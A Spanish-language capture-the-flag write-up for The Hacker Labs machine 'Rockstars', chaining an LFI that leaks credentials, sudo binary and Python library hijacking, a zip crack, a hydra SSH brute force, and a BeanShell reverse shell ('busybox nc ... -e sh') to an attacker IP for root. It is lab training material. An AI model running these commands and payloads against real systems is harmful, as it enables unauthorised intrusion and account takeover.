---
title: "Rockstars"
layout: "post"
categories: [ "The Hacker Labs", "THL - Easy" ]
tags: [ "nmap", "whatweb", "ffuf", "sudo", "binary hijacking", "zip2john", "john", "hydra", "python library hijacking" ]
---

## Info

![Rockstar](/assets/posts/2026-08-07-rockstars-machines-thl/01_rockstars.png)
*Rockstars - The Hacker Labs (Easy)*

Rockstar es una máquina de dificultad Easy de **The Hacker Labs**.

> La Cyber Kill Chain comienza con un **LFI** en un parámetro no documentado de `index.php`, descubierto mediante fuzzing con `ffuf` sobre el propio cuerpo de la petición POST. A través de este LFI se filtra `db.php`, revelando credenciales del usuario `shark`, con quien obtengo acceso por SSH. Desde ahí, un permiso `sudo` mal configurado sobre un binario propio (`bof`) permite un **binary hijacking** trivial que da paso al usuario `wvverez`. Dentro de su directorio se encuentra un `.zip` protegido con contraseña que, tras crackearse con `zip2john` + `john`, entrega una wordlist de contraseñas candidatas; con ella realizo **Fuerza Bruta** vía `hydra` contra SSH y obtengo acceso como `loseey`. Un nuevo permiso `sudo` sobre un script Python vulnerable a **library hijacking** (`psutil.py`) permite escalar lateralmente a `username3`, donde finalmente un permiso `sudo` sobre el binario `bsh` (lanzador de BeanShell) es abusado para lograr **RCE** y obtener una shell como `root`.
{: .prompt-info }

## Descubrimiento de hosts

Inicio con el descubrimiento de hosts activos dentro de la red.

```shell
sudo nmap -sn 10.10.10.0/24

Nmap scan report for 10.10.10.1
Host is up (0.00064s latency).
MAC Address: 00:50:56:C0:00:03 (VMware)
Nmap scan report for 10.10.10.133
Host is up (0.00028s latency).
MAC Address: 00:0C:29:93:14:7F (VMware)
Nmap scan report for 10.10.10.254
Host is up (0.00030s latency).
MAC Address: 00:50:56:F5:C3:75 (VMware)
Nmap scan report for 10.10.10.138
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 5.87 seconds
```

- ATTACKER IP: `10.10.10.138`
- TARGET IP: `10.10.10.133`

## Nmap

Continúo con el descubrimiento de puertos abiertos TCP en el objetivo, almacenando el output en el archivo `allPorts`.

```shell
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn --disable-arp-ping 10.10.10.133 -oG allPorts

Nmap scan report for 10.10.10.133
Host is up (0.00081s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:93:14:7F (VMware)
```

**Parseo de puertos**

Realizo la siguiente expresión regular para filtrar y almacenar los puertos abiertos en la variable `$ports`.

```shell
ports=$(cat allPorts | grep -oP '\d{1,5}(?=/open)' | xargs | tr ' ' ',')
```

**Detección de versiones**

```shell
sudo nmap -sCV -p$ports -Pn --disable-arp-ping 10.10.10.133 -oN version

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 00:0C:29:93:14:7F (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Los únicos puertos abiertos son el 22 y 80, correspondientes a los servicios SSH y HTTP.

## Fingerprinting

Uso `whatweb` para identificar las tecnologías presentes en el servidor.

```shell
whatweb http://10.10.10.133

http://10.10.10.133 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.10.10.133]
```

La página no expone título ni tecnologías adicionales, así que continúo con fuzzing.

## Fuzzing

### Archivos

Inicio con el descubrimiento de archivos en el servidor web.

```shell
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://10.10.10.133/FUZZ -mc all -fc 404

index.html              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5ms]
index.php               [Status: 500, Size: 19, Words: 5, Lines: 1, Duration: 46ms]
.                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 8ms]
```

Archivos interesantes: `index.php` (código de estado 500) y `db.php`.

### Parámetros

Como `index.php` responde con un error 500 y ambos archivos aparentan estar vacíos vistos desde el navegador, sospecho que reciben algún parámetro por POST. A continuación, en lugar de fuzzear rutas, fuzzeo el nombre del parámetro dentro del cuerpo de la petición, usando `/etc/passwd` como valor de prueba.

```shell
ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u "http://10.10.10.133/index.php" -d "FUZZ=/etc/passwd" -H "Content-Type: application/x-www-form-urlencoded" -mc all -fc 404 -fs 19

backdoor                [Status: 200, Size: 1575, Words: 12, Lines: 31, Duration: 15ms]
```

Encuentro el parámetro `backdoor`, válido para el endpoint.

## LFI

Con el parámetro identificado, lo inspecciono con `curl`.

```shell
curl -s -X POST http://10.10.10.133/index.php -d 'backdoor=/etc/passwd' | sed 's/Yo no soy tu marido//' | grep "sh$"

root:x:0:0:root:/root:/bin/bash
shark:x:1001:1001:shark,,,:/home/shark:/bin/bash
wvverez:x:1002:1002:wvverez,,,:/home/wvverez:/bin/bash
loseey:x:1000:1000:loseey,,,:/home/loseey:/bin/bash
username3:x:1003:1003:usernam3,,,:/home/username3:/bin/bash
```

El resultado confirma que el endpoint es vulnerable a **LFI**, además de exponer cuatro usuarios válidos del sistema:
- `shark`
- `wvverez`
- `loseey`
- `username3`

### index.php

A continuación, reviso el propio código fuente de `index.php` (el endpoint vulnerable consultado).

```shell
curl -s -X POST http://10.10.10.133/index.php -d 'backdoor=/var/www/html/index.php' | sed 's/Yo no soy tu marido//'

<?php

echo '';

$backdoor = $_POST["backdoor"];

echo file_get_contents($backdoor);

?>
```

Como se muestra, la función `file_get_contents` recibe directamente el valor del parámetro `backdoor` sin ningún tipo de sanitización ni validación, siendo una de las causas clásicas de LFI en PHP.

### db.php

Continúo consultando `db.php`.

```shell
curl -s -X POST http://10.10.10.133/index.php -d 'backdoor=/var/www/html/db.php' | sed 's/Yo no soy tu marido//'

<?php
$usuario = "shark";
$contrasena = "djbasdnbasdas&$AAAALLthl"; 
?>
```

Obtengo una posible contraseña para el usuario `shark`, que como se vio anteriormente es un usuario válido del sistema.

## Hacia el usuario shark

Intento autenticarme con las credenciales obtenidas.

```shell
ssh shark@10.10.10.133
The authenticity of host '10.10.10.133 (10.10.10.133)' can't be established.
ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: 10.10.10.137
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.133' (ED25519) to the list of known hosts.
shark@10.10.10.133's password: 
Linux TheHackersLabs-RockstarS 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

Last login: Thu Mar 12 17:26:30 2026 from 192.168.91.191
shark@TheHackersLabs-RockstarS:~$ whoami
shark
```

Autenticación válida. Comienzo la enumeración local.

En mi directorio personal tengo un binario llamado `bof` que particularmente me llama la atención.

```shell
ls -l

total 8
-rwxr-xr-x 1 shark shark 7348 mar  8 10:47 bof
```
```shell
file bof 

bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

## Lateral movement to wvverez

Reviso los permisos `sudo` del usuario.

```shell
sudo -l

sudo: unable to resolve host TheHackersLabs-RockstarS: Fallo temporal en la resolución del nombre
Matching Defaults entries for shark on TheHackersLabs-RockstarS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User shark may run the following commands on TheHackersLabs-RockstarS:
    (wvverez) NOPASSWD: /home/shark/bof
```

`shark` puede ejecutar el binario `bof` como el usuario `wvverez`, sin necesidad de proporcionar contraseña. Y dado que ese binario está ubicado en mi propio directorio (`/home/shark/bof`), del cual soy propietario, puedo simplemente reemplazarlo por mi propia instrucción.

```shell
echo "bash -p" > /home/shark/bof
```

Y ejecuto la regla de sudoers.

```shell
sudo -u wvverez /home/shark/bof

sudo: unable to resolve host TheHackersLabs-RockstarS: Fallo temporal en la resolución del nombre
wvverez@TheHackersLabs-RockstarS:/home/shark$ whoami
wvverez
```

Obtengo una shell como `wvverez`.

## Persistencia en la sesión de wvverez

Para no depender de la shell actual, genero un par de claves SSH.

```shell
ssh-keygen -f key

Generating public/private ed25519 key pair.
Enter passphrase for "key" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:5Kla76nW+/j9p9DM+ulFZawUAzSbYAGQA2+qEOGNWtA f4dee@arch
```

Y añado mi clave pública a `wvverez`.

```shell
mkdir ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPYY5/GlnLDjcKhMjcRyLlalrRZB9kH//6UPw9ipD6sh f4dee@arch' > /home/wvverez/.ssh/authorized_keys
```

Luego, en mi máquina atacante, otorgo permisos `600` (también pueden ser `400`) a mi clave privada.

```shell
chmod 600 key
```

Y me autentico usando mi clave privada.

```shell
ssh -i key wvverez@10.10.10.133

Linux TheHackersLabs-RockstarS 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

wvverez@TheHackersLabs-RockstarS:~$ whoami
wvverez
```

### Comprimido rubiales.zip

En mi directorio encuentro el siguiente archivo comprimido.

```shell
ls -l

total 4
-rw-r--r-- 1 root root 366 mar 12 17:45 rubiales.zip
```

Propiedad de `root`. Intento descomprimirlo.

```shell
unzip rubiales.zip 

Archive:  rubiales.zip
[rubiales.zip] passwords.txt password: 
password incorrect--reenter: 
   skipping: passwords.txt           incorrect password
```

Sin embargo, pide una contraseña que desconozco. Descargo el archivo a mi máquina local para trabajarlo sin conexión.

### Transferencia de archivos

Desde la máquina objetivo levanto un servidor HTTP con Python.

```shell
python3 -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Y desde mi máquina atacante descargo el archivo.

```shell
curl -s http://10.10.10.133:9001/rubiales.zip -O
```

### Obteniendo los hashes de contraseña

Siendo un archivo protegido, trato de obtener el hash con `zip2john`.

```shell
zip2john rubiales.zip > rubiales.hash

ver 2.0 efh 5455 efh 7875 rubiales.zip/passwords.txt PKZIP Encr: 2b chk, TS_chk, cmplen=174, decmplen=295, crc=8E99C328
```

### Crackeo con john

```shell
john -w=/usr/share/seclists/rockyou.txt rubiales.hash 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess         (rubiales.zip/passwords.txt)
1g 0:00:00:00 DONE (2026-08-06 01:49) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..total90
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obtengo la contraseña `princess`. Ahora descomprimo.

```shell
unzip rubiales.zip 

Archive:  rubiales.zip
[rubiales.zip] passwords.txt password: 
  inflating: passwords.txt           
```

Obtengo el archivo `passwords.txt`, cuyo contenido es el siguiente:

```shell
cat passwords.txt 

dadADASJNDAKNd1dadad
ajdjAsdaddiandas12313
kmdalskdmasdnmaskj126
djasndjasndjnasdjna12
dasdjnasjdknasdasd098
mkkdjasdasdasdasdada1
dasdjknadnasjdasjldas5
dkjandnkasndasjndjasd12
ldjnansdklnmasldasdd01
dljnasndkjasndjnasdja12
gjndkaskdasjdasndansdn
1dkjnandjkasndjasndjdd
djnasdnsadjnasldnaldn12
```

No es un archivo de credenciales directas, sino una lista de posibles contraseñas.

### Fuerza bruta con hydra

Con el conocimiento de usuarios válidos del sistema y esta lista de posibles contraseñas, inicio un ataque de fuerza bruta con `hydra` contra el servicio SSH.

Primero almaceno los usuarios existentes en un archivo llamado `users`.

```shell
cat << EOF > users
> root
> shark
> wvverez
> loseey
> username3
> EOF
```

Y ahora inicio el ataque.

```shell
hydra -L users -P passwords.txt ssh://10.10.10.133 -t 4

Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-06 02:03:45
[DATA] max 4 tasks per 1 server, overall 4 tasks, 65 login tries (l:5/p:13), ~17 tries per task
[DATA] attacking ssh://10.10.10.133:22/
[22][ssh] host: 10.10.10.133   login: loseey   password: kmdalskdmasdnmaskj126
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-06 02:04:30
```

Después de un momento se presentan las siguientes credenciales válidas: `loseey:kmdalskdmasdnmaskj126`.

## Lateral movement to loseey

Obtengo acceso como el usuario `loseey`.

```shell
ssh loseey@10.10.10.133

loseey@10.10.10.133's password: 
Linux TheHackersLabs-RockstarS 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

loseey@TheHackersLabs-RockstarS:~$ whoami
loseey
```

En el directorio se encuentra un script de Python llamado `rubiales.py`.

```shell
ls

rubiales.py
```

Cuyo contenido es el siguiente:

```python
import psutil


def print_virtual_memory():
    vm = psutil.virtual_memory()
    print(f"Total: {vm.total} Available: {vm.available}")


if __name__ == "__main__":
    print_virtual_memory()
```

El script consulta la memoria RAM del sistema y muestra la cantidad total instalada y la actualmente disponible, importando la librería `psutil`.

A continuación, reviso los permisos `sudo`.

```shell
sudo -l

sudo: unable to resolve host TheHackersLabs-RockstarS: Fallo temporal en la resolución del nombre
Matching Defaults entries for loseey on TheHackersLabs-RockstarS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User loseey may run the following commands on TheHackersLabs-RockstarS:
    (username3) NOPASSWD: /usr/bin/python3 /home/loseey/rubiales.py
```

La salida expone que `loseey` puede ejecutar `rubiales.py` como el usuario `username3`, sin proporcionar contraseña.

## Lateral movement to username3

### Library hijacking

Ahora, hablando de librerías... ¿podría secuestrar la que utiliza el script? Es decir, realizar **library hijacking**. Reviso el `path` de Python.

```shell
python3 -c 'import sys; print(sys.path)'

['', '/usr/lib/python311.zip', '/usr/lib/python3.11', '/usr/lib/python3.11/lib-dynload', '/home/loseey/.local/lib/python3.11/site-packages', '/usr/local/lib/python3.11/dist-packages', '/usr/lib/python3/dist-packages']
```

> Más sobre esta técnica: [Path Hijacking y Library Hijacking](https://deephacking.tech/path-hijacking-y-library-hijacking/) / [Python Library Hijacking on Linux with Examples](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
{: .prompt-tip }

Como se observa, la cadena `''` (directorio de trabajo actual) tiene prioridad en la resolución de imports, por lo que puedo crear un módulo `psutil.py` propio en el mismo directorio desde el que se invoca el script, y Python lo cargará antes que la librería legítima.

```shell
touch psutil.py
cat << EOF > psutil.py
> import os
> 
> os.system("bash -p")
> EOF
```

Ahora ejecuto la regla de sudoers.

```shell
sudo -u username3 python3 /home/loseey/rubiales.py

sudo: unable to resolve host TheHackersLabs-RockstarS: Fallo temporal en la resolución del nombre
username3@TheHackersLabs-RockstarS:/home/loseey$ whoami
username3
```

Tras un breve momento, obtengo acceso como el usuario `username3`.

## user.txt

```shell
username3@TheHackersLabs-RockstarS:~$ cat user.txt 
ASss31
```

## PrivEsc

Reviso los permisos `sudo` del usuario.

```shell
sudo -l

sudo: unable to resolve host TheHackersLabs-RockstarS: Fallo temporal en la resolución del nombre
Matching Defaults entries for username3 on TheHackersLabs-RockstarS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User username3 may run the following commands on TheHackersLabs-RockstarS:
    (root) NOPASSWD: /usr/bin/bsh
```

El usuario puede ejecutar el binario `bsh` como `root` sin proporcionar contraseña.

Reviso los permisos y el propietario del archivo.

```shell
ls -l /usr/bin/bsh

-rwxr-xr-x 1 root root 230 sep  9  2019 /usr/bin/bsh
```

Cuyo contenido es el siguiente:

```shell
#!/bin/sh

if [ "$1" = "-classpath" ]
then
  CLASSPATH="$2"
  shift 2
fi

CLASSPATH="${CLASSPATH:-.}:/usr/share/java/jline.jar:/usr/share/java/bsh.jar"
export CLASSPATH

exec /usr/bin/java jline.ConsoleRunner bsh.Interpreter "$@"
```

Este script actúa como un lanzador de [BeanShell](https://beanshell.org/intro.html). Su función es:

- Aceptar opcionalmente un `-classpath` personalizado.
- Añadir automáticamente las bibliotecas necesarias (`jline.jar` y `bsh.jar`, [JLine](https://jline.org/)).
- Exportar el `CLASSPATH`.
- Ejecutar el intérprete BeanShell con una consola interactiva mejorada gracias a JLine.

Tras una búsqueda, encuentro un artículo que explica una misconfiguration que permite lograr **RCE** en BeanShell: [BeanShell and JMX - Using BeanShell for Remote Code Execution](https://medium.com/@naseef2001/beanshell-and-jmx-using-beanshell-for-remote-code-execution-rce-57bbac8fc79e).

> El artículo explica que un payload puede invocar clases de Java para ejecutar comandos del sistema operativo directamente desde la consola interactiva de BeanShell, por ejemplo mediante `Runtime.getRuntime().exec(...)`.
{: .prompt-info }

Dado que tengo permisos `sudo` para ejecutar `bsh` como `root`, esto se traduce en una **RCE con privilegios de root**.

### Explotación

Primero me pongo en escucha por el puerto **443**.

```shell
sudo nc -lnvp 443

Listening on 0.0.0.0 443
```

Y ejecuto el binario, añadiendo el payload dentro de la consola de BeanShell.

```shell
sudo -u root /usr/bin/bsh

sudo: unable to resolve host TheHackersLabs-RockstarS: Fallo temporal en la resolución del nombre
BeanShell 2.0b4 - by Pat Niemeyer (pat@pat.net)
bsh % Runtime.getRuntime().exec("busybox nc 10.10.10.138 443 -e sh");
```

> Uso `busybox nc` en lugar de `netcat` porque este último no está disponible en la máquina víctima; `busybox` trae su propio applet de netcat integrado, cubriendo casi cualquier escenario <3.
{: .prompt-tip }

## root.txt

Tras la ejecución, recibo una reverse shell como el usuario `root`.

```shell
sudo nc -lnvp 443

Listening on 0.0.0.0 443
Connection received on 10.10.10.133 60748
whoami
root
```

Realizo el tratamiento de la TTY para tener mayor control y flexibilidad.

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# [ Control + Z ]
[1]+  Stopped                    sudo nc -lnvp 443
stty raw -echo; fg
sudo nc -lnvp 443

export TERM=xterm-256color
stty rows 48 cols 212
```

Finalmente obtengo la flag final.

```shell
cat /root/root.txt 

aSASDA12JJjadjasdthlrootddd
```

> De forma opcional, se puede obtener persistencia en la sesión de `root` añadiendo una clave pública propia, tal como se hizo previamente con `wvverez`.
{: .prompt-tip }
